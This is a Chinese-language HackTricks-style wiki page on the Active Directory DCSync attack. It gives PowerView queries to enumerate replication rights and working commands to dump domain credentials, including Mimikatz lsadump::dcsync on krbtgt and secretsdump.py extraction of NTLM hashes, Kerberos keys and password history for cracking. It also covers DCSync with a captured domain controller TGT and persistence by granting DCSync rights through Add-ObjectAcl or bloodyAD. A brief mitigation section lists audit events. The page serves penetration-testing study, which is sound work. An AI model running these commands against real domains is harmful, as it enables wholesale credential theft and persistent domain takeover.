# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 权限意味着在域本身上拥有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。<sup>[[3]](#references)</sup>

**关于 DCSync 的重要说明：**

- **DCSync attack 会模拟 Domain Controller 的行为，并使用 Directory Replication Service Remote Protocol (MS-DRSR) 请求其他 Domain Controller 复制信息**。由于 MS-DRSR 是 Active Directory 的有效且必要功能，因此无法将其关闭或禁用。
- 默认情况下，只有 **Domain Admins、Enterprise Admins、Administrators 和 Domain Controllers** 组拥有所需权限。
- 实际上，**完整的 DCSync** 需要在域命名上下文中拥有 **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`**。`DS-Replication-Get-Changes-In-Filtered-Set` 通常会与它们一同委派，但单独使用时，它更适用于同步 **confidential / RODC-filtered attributes**（例如旧版 LAPS 风格的 secrets），而不是完整的 krbtgt dump。<sup>[[2]](#references)</sup>
- 如果某些 account passwords 使用 reversible encryption 存储，Mimikatz 提供了以明文返回密码的选项

### Enumeration

使用 `powerview` 检查哪些用户拥有这些权限：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
如果你想重点关注拥有 DCSync 权限的**非默认主体**，请排除内置的、具备 replication 能力的组，仅审查异常的受托者：
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### 本地利用
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程利用
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
实际的限定范围示例：<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### 使用捕获的 DC machine TGT (ccache) 执行 DCSync

在 unconstrained-delegation export-mode 场景中，你可能会捕获 Domain Controller machine TGT（例如，用于 `krbtgt@DOMAIN` 的 `DC1$@DOMAIN`）。随后，你可以使用该 ccache 以 DC 身份进行身份验证，并在无需密码的情况下执行 DCSync。<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
操作说明：

- **Impacket 的 Kerberos path 会先访问 SMB**，然后才调用 DRSUAPI。如果环境强制执行 **SPN target name validation**，完整 dump 可能会失败并提示 `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`。
- 在这种情况下，可以先为目标 DC 请求一个 **`cifs/<dc>`** service ticket，或者对你立即需要的账户使用 **`-just-dc-user`** 作为 fallback。
- 当你只有较低级别的 replication 权限时，LDAP/DirSync-style syncing 仍可能暴露 **confidential** 或 **RODC-filtered** attributes（例如旧版 `ms-Mcs-AdmPwd`），而不需要完整的 krbtgt replication。<sup>[[2]](#references)</sup>

`-just-dc` 会生成 3 个文件：

- 一个包含 **NTLM hashes**
- 一个包含 **Kerberos keys**
- 一个包含 NTDS 中启用了[**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)的账户的明文密码。你可以使用以下命令获取启用了 reversible encryption 的用户：

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持久化

如果你是 domain admin，可以借助 `powerview` 向任意用户授予此权限：<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux 操作员也可以使用 `bloodyAD` 执行相同操作：
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
然后，你可以在以下命令的输出中查找这 3 个权限，以**检查是否已正确为用户分配**这些权限（你应该能在 "ObjectType" 字段中看到这些权限的名称）：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解

- Security Event ID 4662（必须启用对象的 Audit Policy）– 对对象执行了一项操作<sup>[[4]](#references)</sup>
- Security Event ID 5136（必须启用对象的 Audit Policy）– 修改了一个目录服务对象
- Security Event ID 4670（必须启用对象的 Audit Policy）– 更改了对象的权限
- AD ACL Scanner - 创建并比较 ACL 报告。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考资料

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync：利用 Replication Get-Changes 和 Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync：从 Domain Controller Dump Password Hashes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
